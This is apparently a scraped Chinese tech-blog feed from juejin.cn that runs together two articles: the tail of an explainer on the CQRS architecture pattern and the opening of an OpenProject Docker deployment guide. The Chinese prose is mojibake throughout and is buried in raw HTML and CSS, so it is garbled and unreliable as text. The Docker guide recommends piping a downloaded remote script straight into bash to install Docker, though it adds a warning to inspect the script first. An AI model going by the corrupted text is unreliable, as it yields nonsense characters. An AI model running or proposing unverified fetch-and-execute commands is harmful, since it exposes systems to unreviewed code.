<p>å®ƒä¸æ˜¯é“¶å¼¹ï¼Œå´æ˜¯<strong>å¤æ‚ä¸šåŠ¡ç³»ç»Ÿèµ°å‘é«˜æ€§èƒ½ã€é«˜å¯ç»´æŠ¤æ€§çš„å…³é”®ä¸€æ­¥</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€CQRS æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯è¯´æ¸…</h2>
<blockquote>
<p><strong>CQRS = å‘½ä»¤ï¼ˆå†™ï¼‰å’ŒæŸ¥è¯¢ï¼ˆè¯»ï¼‰ç”¨ä¸åŒçš„æ¨¡å‹å¤„ç†ã€‚</strong></p>
</blockquote>
<ul>
<li><strong>Commandï¼ˆå‘½ä»¤ï¼‰</strong> ï¼šä¼šæ”¹å˜ç³»ç»ŸçŠ¶æ€çš„æ“ä½œï¼Œå¦‚ <code>åˆ›å»ºè®¢å•</code>ã€<code>æ”¯ä»˜è®¢å•</code>ï¼›</li>
<li><strong>Queryï¼ˆæŸ¥è¯¢ï¼‰</strong> ï¼šåªè¯»å–æ•°æ®ï¼Œå¦‚ <code>æŸ¥çœ‹è®¢å•è¯¦æƒ…</code>ã€<code>æœç´¢å†å²è®¢å•</code>ã€‚</li>
</ul>
<p>ä¼ ç»Ÿ CRUD ç³»ç»Ÿä¸­ï¼Œè¯»å†™å…±ç”¨ä¸€ä¸ª <code>Order</code> å¯¹è±¡ï¼›è€Œ CQRS ä¸»å¼ ï¼š</p>
<ul>
<li><strong>å†™æ¨¡å‹</strong>èšç„¦ä¸šåŠ¡è§„åˆ™ä¸ä¸€è‡´æ€§ï¼›</li>
<li><strong>è¯»æ¨¡å‹</strong>ä¸“æ³¨æŸ¥è¯¢æ•ˆç‡ä¸çµæ´»æ€§ã€‚</li>
</ul>
<p>äºŒè€…å¯ä»¥ç»“æ„ä¸åŒã€æŠ€æœ¯æ ˆä¸åŒï¼Œç”šè‡³å­˜å‚¨åœ¨ä¸åŒæ•°æ®åº“ä¸­ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ä¸ºä»€ä¹ˆéœ€è¦ CQRSï¼Ÿä»ç—›ç‚¹å‡ºå‘</h2>
<h3 data-id="heading-2">åœºæ™¯ 1ï¼šæ¨¡å‹è¶Šæ¥è¶Šè‡ƒè‚¿</h3>
<p>ä¸€ä¸ª <code>Order</code> ç±»æ—¢è¦åŒ…å«åˆ›å»ºæ—¶çš„æ ¡éªŒé€»è¾‘ï¼Œåˆè¦æ”¯æŒâ€œæŒ‰ç”¨æˆ·+æ—¶é—´+çŠ¶æ€+å•†å“ç±»ç›®+ä¼˜æƒ ç±»å‹â€ç»„åˆæŸ¥è¯¢ã€‚ä»£ç è€¦åˆä¸¥é‡ï¼Œæ”¹ä¸€å¤„æ€•å´©å…¨å±€ã€‚</p>
<h3 data-id="heading-3">åœºæ™¯ 2ï¼šè¯»å†™äº’ç›¸æ‹–ç´¯</h3>
<p>å¤§ä¿ƒæœŸé—´ï¼Œæ¯ç§’ä¸‡çº§ä¸‹å•ï¼ˆå†™å¯†é›†ï¼‰ï¼ŒåŒæ—¶è¿è¥åœ¨è·‘æœˆåº¦æŠ¥è¡¨ï¼ˆè¯»å¯†é›†ï¼‰ã€‚åŒä¸€å¼ è¡¨æ—¢è¦åšé«˜é¢‘ INSERT/UPDATEï¼Œåˆè¦æ‰§è¡Œå¤æ‚ JOINï¼Œæ•°æ®åº“ CPU ç›´æ¥æ‹‰æ»¡ã€‚</p>
<h3 data-id="heading-4">åœºæ™¯ 3ï¼šæŸ¥è¯¢éœ€æ±‚åƒå¥‡ç™¾æ€ª</h3>
<p>å‰ç«¯è¦å®æ—¶å±•ç¤ºâ€œæœ€è¿‘3å•â€ï¼ŒBI è¦åˆ†æâ€œæŸå“ç±»å¤è´­ç‡â€ï¼Œå®¢æœè¦æ¨¡ç³Šæœâ€œå«â€˜iPhoneâ€™çš„è®¢å•â€â€¦â€¦è¿™äº›éœ€æ±‚è‹¥éƒ½å‹åˆ°äº¤æ˜“åº“ï¼Œç³»ç»Ÿè¿Ÿæ—©å´©æºƒã€‚</p>
<blockquote>
<p>âœ… <strong>CQRS çš„ä»·å€¼</strong>ï¼š</p>
<ul>
<li>å†™æ¨¡å‹ä¿æŒ<strong>ç®€æ´ã€å¼ºä¸€è‡´</strong>ï¼›</li>
<li>è¯»æ¨¡å‹å¯ä»¥<strong>é«˜åº¦å®šåˆ¶ã€æœ€ç»ˆä¸€è‡´</strong>ï¼›</li>
<li>è¯»å†™<strong>ç‰©ç†éš”ç¦»</strong>ï¼Œäº’ä¸å½±å“ã€‚</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€CQRS çš„ä¸¤ç§å½¢æ€ï¼šä»è½»é‡åˆ°å®Œæ•´</h2>
<h3 data-id="heading-6">â–¶ å½¢æ€ 1ï¼šç®€å• CQRSï¼ˆåŒåº“å¼‚æ¨¡ï¼‰</h3>
<ul>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šä¸­å°å‹ç³»ç»Ÿï¼Œæ”¹é€ æˆæœ¬ä½</p>
</li>
<li>
<p><strong>åšæ³•</strong>ï¼š</p>
<ul>
<li>åŒä¸€ä¸ªæ•°æ®åº“</li>
<li>ä½†æ‹†åˆ†ä¸º <code>OrderCommandService</code> å’Œ <code>OrderQueryService</code></li>
<li>æŸ¥è¯¢å¯èµ°è§†å›¾ã€å®½è¡¨æˆ–ç¼“å­˜</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å†™ï¼šåªå…³å¿ƒä¸šåŠ¡è§„åˆ™</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">CreateOrderCmd cmd</span>) {
    <span class="hljs-comment">// æ ¡éªŒåº“å­˜ã€ä¼˜æƒ ã€ç”Ÿæˆè®¢å• â†’ insert into orders</span>
}

<span class="hljs-comment">// è¯»ï¼šåªå…³å¿ƒæŸ¥è¯¢æ•ˆç‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">OrderSummary</span>&gt; <span class="hljs-title function_">searchOrders</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> keyword</span>) {
    <span class="hljs-comment">// select * from order_search_view where ...</span>
}
</code></pre>
<p>âœ… <strong>ä¼˜ç‚¹</strong>ï¼šæ”¹åŠ¨å°ï¼Œè§æ•ˆå¿«<br/>
âŒ <strong>å±€é™</strong>ï¼šæ— æ³•å½»åº•è§£è€¦å­˜å‚¨å‹åŠ›</p>
<hr/>
<h3 data-id="heading-7">â–¶ å½¢æ€ 2ï¼šå®Œæ•´ CQRSï¼ˆå¼‚åº“å¼‚æ„ï¼‰</h3>
<ul>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šé«˜å¹¶å‘ã€å¤šç«¯æŸ¥è¯¢çš„å¤§å‹ç³»ç»Ÿï¼ˆå¦‚ç”µå•†ã€é‡‘èï¼‰</p>
</li>
<li>
<p><strong>æ¶æ„</strong>ï¼š</p>
<ul>
<li><strong>å†™åº“</strong>ï¼šMySQL / PostgreSQLï¼Œä¿è¯ ACID</li>
<li><strong>è¯»åº“</strong>ï¼šElasticsearchï¼ˆå…¨æ–‡æœç´¢ï¼‰ã€Redisï¼ˆç¼“å­˜èšåˆï¼‰ã€ClickHouseï¼ˆåˆ†æï¼‰</li>
<li><strong>åŒæ­¥æœºåˆ¶</strong>ï¼šé€šè¿‡ Binlogï¼ˆCanalï¼‰æˆ–äº‹ä»¶æ¶ˆæ¯ï¼ˆRocketMQ/Kafkaï¼‰é©±åŠ¨</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[ç”¨æˆ·ä¸‹å•]</span>
    â†“
(Order Service) â†’ å†™å…¥ MySQLï¼ˆCommandï¼‰
    â†“
å‘å¸ƒ "OrderCreated" äº‹ä»¶
    â†“
(Read Model Builder) æ¶ˆè´¹äº‹ä»¶ â†’ æ›´æ–° ES / Redis
    â†“
<span class="hljs-selector-attr">[å‰ç«¯æœç´¢]</span> â† (Search Service) â† ä» ES æŸ¥è¯¢ï¼ˆQueryï¼‰
</code></pre>
<p>âœ… <strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>å†™è·¯å¾„æç®€ï¼Œå“åº”å¿«ï¼ˆ&lt;50msï¼‰</li>
<li>è¯»è·¯å¾„æ”¯æŒæ¨¡ç³Šã€å¤šç»´ã€èšåˆæŸ¥è¯¢</li>
<li>å¯ç‹¬ç«‹æ‰©ç¼©å®¹ï¼ˆå¦‚å¤§ä¿ƒå‰åŠ  ES èŠ‚ç‚¹ï¼‰</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>çœŸå®æ¡ˆä¾‹</strong>ï¼š<br/>
æ·˜å®è®¢å•æœç´¢ã€äº¬ä¸œè®¢å•ä¸­å¿ƒã€ç¾å›¢äº¤æ˜“ç³»ç»Ÿï¼Œå‡é‡‡ç”¨æ­¤æ¨¡å¼ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">å››ã€CQRS ä¸æ˜¯é“¶å¼¹ï¼šè¿™äº›å‘è¦é¿å¼€</h2>
<h3 data-id="heading-9">âŒ è¯¯åŒº 1ï¼šæ‰€æœ‰ç³»ç»Ÿéƒ½è¦ä¸Š CQRS</h3>
<ul>
<li><strong>äº‹å®</strong>ï¼šç®€å• CRUD åº”ç”¨ï¼ˆå¦‚å†…éƒ¨ç®¡ç†ç³»ç»Ÿï¼‰å¼•å…¥ CQRS åªä¼šå¢åŠ å¤æ‚åº¦ã€‚</li>
<li><strong>å»ºè®®</strong>ï¼šä»…å½“<strong>è¯»å†™è´Ÿè½½å·®å¼‚å¤§</strong>æˆ–<strong>æŸ¥è¯¢åœºæ™¯å¤æ‚</strong>æ—¶æ‰è€ƒè™‘ã€‚</li>
</ul>
<h3 data-id="heading-10">âŒ è¯¯åŒº 2ï¼šCQRS = è¯»å†™åˆ†ç¦»ï¼ˆä¸»ä»å¤åˆ¶ï¼‰</h3>
<ul>
<li>
<p><strong>åŒºåˆ«</strong>ï¼š</p>
<ul>
<li>è¯»å†™åˆ†ç¦»ï¼š<strong>åŒä¸€æ¨¡å‹</strong>ï¼Œåªæ˜¯è¯»èµ°ä»åº“ï¼›</li>
<li>CQRSï¼š<strong>ä¸åŒæ¨¡å‹</strong>ï¼Œç»“æ„ã€ç”¨é€”ã€å­˜å‚¨å‡å¯ä¸åŒã€‚</li>
</ul>
</li>
<li>
<p><strong>å…³é”®</strong>ï¼šCQRS çš„è¯»æ¨¡å‹å¾€å¾€æ˜¯<strong>ä¸ºæŸ¥è¯¢ä¸“é—¨ä¼˜åŒ–çš„è§†å›¾</strong>ï¼Œè€ŒéåŸå§‹è¡¨çš„å‰¯æœ¬ã€‚</p>
</li>
</ul>
<h3 data-id="heading-11">âŒ è¯¯åŒº 3ï¼šæ•°æ®å¿…é¡»å®æ—¶ä¸€è‡´</h3>
<ul>
<li>
<p><strong>çœŸç›¸</strong>ï¼šCQRS å¤©ç„¶æ¥å—<strong>æœ€ç»ˆä¸€è‡´æ€§</strong>ã€‚</p>
</li>
<li>
<p><strong>å¯¹ç­–</strong>ï¼š</p>
<ul>
<li>å…³é”®è·¯å¾„ï¼ˆå¦‚ä¸‹å•åç«‹å³æŸ¥è¯¦æƒ…ï¼‰å¯èµ°å†™åº“ï¼›</li>
<li>éå…³é”®è·¯å¾„ï¼ˆå¦‚æœç´¢ã€æŠ¥è¡¨ï¼‰èµ°è¯»åº“ï¼Œå»¶è¿Ÿ 1~3 ç§’å¯æ¥å—ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">äº”ã€ä½•æ—¶è¯¥ç”¨ CQRSï¼Ÿä¸€å¼ å†³ç­–å›¾</h2>
<pre><code class="hljs language-bash" lang="bash">ä½ çš„ç³»ç»Ÿæ˜¯å¦æ»¡è¶³ä»¥ä¸‹ä»»ä¸€ï¼Ÿ
â”œâ”€â”€ è¯»å†™ QPS å·®å¼‚å·¨å¤§ï¼ˆå¦‚å†™ 1k/sï¼Œè¯» 100k/sï¼‰ â†’ âœ… ç”¨
â”œâ”€â”€ æŸ¥è¯¢ç»´åº¦å¤šã€æ¡ä»¶å¤æ‚ï¼ˆæ¨¡ç³Šã€èšåˆã€è·¨åŸŸï¼‰ â†’ âœ… ç”¨
â”œâ”€â”€ éœ€è¦å¤šç§æ•°æ®è§†å›¾ï¼ˆç”¨æˆ·ç«¯ã€è¿è¥ç«¯ã€BIï¼‰ â†’ âœ… ç”¨
â””â”€â”€ ä¸šåŠ¡ç®€å•ï¼Œåªæœ‰å¢åˆ æ”¹æŸ¥ â†’ âŒ ä¸ç”¨
</code></pre>
<blockquote>
<p>ğŸ”‘ <strong>ç»éªŒæ³•åˆ™</strong>ï¼š<br/>
å¦‚æœä½ å·²ç»å¼€å§‹ä¸ºâ€œæŸ¥è¯¢å¤ªæ…¢â€å»ºå„ç§å†—ä½™å­—æ®µæˆ–ç‰©åŒ–è§†å›¾ï¼Œ<br/>
é‚£å°±æ˜¯ CQRS åœ¨å‘ä½ æ‹›æ‰‹äº†ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">å…­ã€æ€»ç»“</h2>
<p>CQRS çš„æœ¬è´¨ï¼Œä¸æ˜¯æŠ€æœ¯ç‚«æŠ€ï¼Œè€Œæ˜¯<strong>å¯¹ç³»ç»ŸèŒè´£çš„æ¸…é†’è®¤çŸ¥</strong>ï¼š</p>
<ul>
<li><strong>å†™ï¼Œè¦ç¨³</strong>ï¼šä¿è¯æ•°æ®æ­£ç¡®ã€äº‹åŠ¡å¯é ï¼›</li>
<li><strong>è¯»ï¼Œè¦å¿«</strong>ï¼šæ”¯æŒçµæ´»ã€é«˜æ•ˆã€å¤šæ ·åŒ–çš„è®¿é—®ã€‚</li>
</ul>
<p>å®ƒè®©æ¶æ„å¸ˆèƒ½<strong>ä¸ºä¸åŒåœºæ™¯é€‰æ‹©æœ€ä¼˜è§£</strong>ï¼Œè€Œä¸æ˜¯è®©ä¸€ä¸ªæ¨¡å‹â€œæ—¢è¦åˆè¦è¿˜è¦â€ã€‚</p>
<blockquote>
<p>ğŸŒŸ <strong>è®°ä½</strong>ï¼š</p>
<ul>
<li>å°ç³»ç»Ÿç”¨ç®€å• CQRSï¼ˆæ¥å£åˆ†ç¦»ï¼‰ï¼›</li>
<li>å¤§ç³»ç»Ÿç”¨å®Œæ•´ CQRSï¼ˆå¼‚æ„å­˜å‚¨ + äº‹ä»¶é©±åŠ¨ï¼‰ï¼›</li>
<li>æ°¸è¿œä¸è¦ä¸ºäº†ç”¨ CQRS è€Œç”¨ CQRSã€‚</li>
</ul>
</blockquote>
<p>å½“ä½ ä¸‹æ¬¡é¢å¯¹â€œåˆæƒ³å¿«åˆæƒ³å‡†åˆæƒ³çµæ´»â€çš„éœ€æ±‚æ—¶ï¼Œä¸å¦¨è¯•è¯• CQRS â€”â€” å®ƒå¯èƒ½å°±æ˜¯é‚£æŠŠè§£å¼€ç³»ç»Ÿæ·é”çš„é’¥åŒ™ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenProject Docker å®¹å™¨åŒ–éƒ¨ç½²æŒ‡å—ï¼šä»å¿«é€Ÿå¯åŠ¨åˆ°ç”Ÿäº§ç¯å¢ƒé…ç½®]]></title>    <link>https://juejin.cn/post/7602454700504514601</link>    <guid>https://juejin.cn/post/7602454700504514601</guid>    <pubDate>2026-02-04T02:02:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700504514601" data-draft-id="7602512064976470079" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenProject Docker å®¹å™¨åŒ–éƒ¨ç½²æŒ‡å—ï¼šä»å¿«é€Ÿå¯åŠ¨åˆ°ç”Ÿäº§ç¯å¢ƒé…ç½®"/> <meta itemprop="keywords" content="å¼€æº,Docker,å®¹å™¨"/> <meta itemprop="datePublished" content="2026-02-04T02:02:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è€èµµ"/> <meta itemprop="url" content="https://juejin.cn/user/3208848015890347"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenProject Docker å®¹å™¨åŒ–éƒ¨ç½²æŒ‡å—ï¼šä»å¿«é€Ÿå¯åŠ¨åˆ°ç”Ÿäº§ç¯å¢ƒé…ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3208848015890347/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è€èµµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:02:38.000Z" title="Wed Feb 04 2026 02:02:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»23åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ¦‚è¿°</h2>
<p>OpenProjectæ˜¯ä¸€æ¬¾åŠŸèƒ½å…¨é¢çš„å¼€æºé¡¹ç›®ç®¡ç†å¹³å°ï¼Œæ”¯æŒæ•æ·ç®¡ç†ã€ä»»åŠ¡è·Ÿè¸ªã€å·¥æ—¶è®°å½•ã€æˆæœ¬æ§åˆ¶ç­‰å¤šç§é¡¹ç›®ç®¡ç†éœ€æ±‚ï¼Œæä¾›ç¤¾åŒºç‰ˆå’Œä¼ä¸šç‰ˆä¸¤ç§éƒ¨ç½²é€‰é¡¹ï¼Œé€‚é…ä¸åŒè§„æ¨¡å›¢é˜Ÿä¸ç»„ç»‡çš„ä½¿ç”¨åœºæ™¯ã€‚</p>
<p>é‡‡ç”¨Dockerå®¹å™¨åŒ–éƒ¨ç½²OpenProjectï¼Œå¯æ˜¾è‘—ç®€åŒ–ä¼ ç»Ÿéƒ¨ç½²ä¸­çš„ç¯å¢ƒé…ç½®å¤æ‚åº¦ï¼Œå®ç°å¿«é€Ÿæ­å»ºã€çµæ´»æ‰©å±•ä¸ä¾¿æ·å‡çº§ã€‚æœ¬æ–‡åŸºäº<strong>è½©è¾•é•œåƒè®¿é—®æ”¯æŒå¹³å°</strong>æä¾›çš„<code>openproject/openproject</code>é•œåƒï¼ˆå…¼å®¹å®˜æ–¹é•œåƒï¼‰ï¼Œè¯¦ç»†ä»‹ç»ä»ç¯å¢ƒå‡†å¤‡ã€å¿«é€Ÿå¯åŠ¨ã€è¿›é˜¶é…ç½®åˆ°ç”Ÿäº§ç¯å¢ƒé›†ç¾¤éƒ¨ç½²çš„å®Œæ•´æµç¨‹ï¼ŒåŒæ—¶è¦†ç›–æ’ä»¶å®šåˆ¶ã€ç¦»çº¿éƒ¨ç½²ç­‰é«˜çº§æ“ä½œï¼Œå¸®åŠ©ç”¨æˆ·é«˜æ•ˆæ­å»ºç¨³å®šã€å®‰å…¨çš„OpenProjecté¡¹ç›®ç®¡ç†ç³»ç»Ÿã€‚</p>
<p>OpenProject Dockeré•œåƒæä¾›ä¸¤ç§æ ¸å¿ƒç‰ˆæœ¬ï¼Œé€‚é…ä¸åŒä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
<li><code>all-in-one</code>ï¼šå†…ç½®PostgreSQLã€Memcachedç­‰ä¾èµ–æœåŠ¡ï¼Œä¸€é”®å¯åŠ¨ï¼Œé€‚åˆ<strong>æµ‹è¯•ã€PoCã€æ¼”ç¤ºæˆ–éå…³é”®å°å‹ä¸šåŠ¡</strong>ï¼Œå¯æ‰©å±•æ€§è¾ƒå·®ï¼Œ<strong>ä¸¥ç¦ç”¨äºå¤§è§„æ¨¡/æ ¸å¿ƒç”Ÿäº§ç¯å¢ƒ</strong>ã€‚</li>
<li><code>slim</code>ï¼šä»…åŒ…å«åº”ç”¨ç¨‹åºä¸åº”ç”¨æœåŠ¡å™¨ï¼Œéœ€é…åˆå¤–éƒ¨æ•°æ®åº“ã€ç¼“å­˜æœåŠ¡ä½¿ç”¨ï¼ˆå¯é€šè¿‡Docker Compose/Swarmç¼–æ’ï¼‰ï¼Œèµ„æºå ç”¨æ›´ä½ã€å¯æ‰©å±•æ€§æ›´å¼ºï¼Œæ˜¯<strong>ç”Ÿäº§ç¯å¢ƒçš„å”¯ä¸€æ¨èé€‰æ‹©</strong>ã€‚</li>
</ol>
<p>æ­¤å¤–ï¼ŒOpenProject 12.5.6åŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒ<code>AMD64ï¼ˆx86ï¼‰</code>å’Œ<code>ARM64</code>ä¸¤ç§æ¶æ„ï¼Œå…¶ä¸­BIMç‰ˆä»…æ”¯æŒ<code>AMD64</code>æ¶æ„ã€‚</p>
<h2 data-id="heading-1">ç¯å¢ƒå‡†å¤‡</h2>
<h3 data-id="heading-2">Dockerç¯å¢ƒå®‰è£…</h3>
<p>éƒ¨ç½²OpenProjectå®¹å™¨å‰ï¼Œéœ€ç¡®ä¿ç›®æ ‡æœåŠ¡å™¨å·²å®‰è£…Dockerç¯å¢ƒï¼ˆæ¨èDocker 20.10åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰ã€‚æ¨èä½¿ç”¨è½©è¾•é•œåƒæä¾›çš„ä¸€é”®å®‰è£…è„šæœ¬ï¼Œè‡ªåŠ¨é…ç½®DockeråŠç›¸å…³ä¾èµ–ï¼ˆå…¼å®¹CentOSã€Ubuntuç­‰ä¸»æµå‘è¡Œç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">bash &lt;(wget -qO- https://xuanyuan.cloud/docker.sh)
</code></pre>
<h4 data-id="heading-3">å®‰å…¨è¯´æ˜ï¼ˆé‡è¦ï¼‰</h4>
<ol>
<li>ä¸€é”®æ‰§è¡Œè¿œç¨‹è„šæœ¬å­˜åœ¨æ½œåœ¨å®‰å…¨é£é™©ï¼Œå»ºè®®å…ˆæŸ¥çœ‹è„šæœ¬å†…å®¹ç¡®è®¤æ— æ¶æ„ä»£ç ï¼š<code>wget -O docker.sh https://xuanyuan.cloud/docker.sh &amp;&amp; cat docker.sh</code>ã€‚</li>
<li>è‹¥éœ€æ›´é«˜å®‰å…¨æ€§ï¼Œå¯é€šè¿‡å®˜æ–¹æ–‡æ¡£æ‰‹åŠ¨å®‰è£…Dockerï¼Œé¿å…æ‰§è¡ŒæœªçŸ¥æ¥æºçš„è¿œç¨‹è„šæœ¬ã€‚</li>
<li>è¯¥è„šæœ¬ä»…ç”¨äºå¿«é€Ÿéƒ¨ç½²æµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®é€šè¿‡ç³»ç»ŸåŒ…ç®¡ç†å™¨ï¼ˆyum/aptï¼‰å®‰è£…å¹¶éªŒè¯DockeråŒ…çš„SHAæ ¡éªŒå€¼ã€‚</li>
</ol>
<p>å®‰è£…å®Œæˆåï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤éªŒè¯Dockeræ˜¯å¦æ­£å¸¸è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker --version  <span class="hljs-comment"># æ£€æŸ¥Dockerç‰ˆæœ¬ï¼Œè¾“å‡ºç±»ä¼¼ Docker version 26.0.0, build 2ae903e</span>
systemctl status docker  <span class="hljs-comment"># æ£€æŸ¥DockeræœåŠ¡çŠ¶æ€ï¼Œç¡®ä¿çŠ¶æ€ä¸º active (running)</span>
</code></pre>
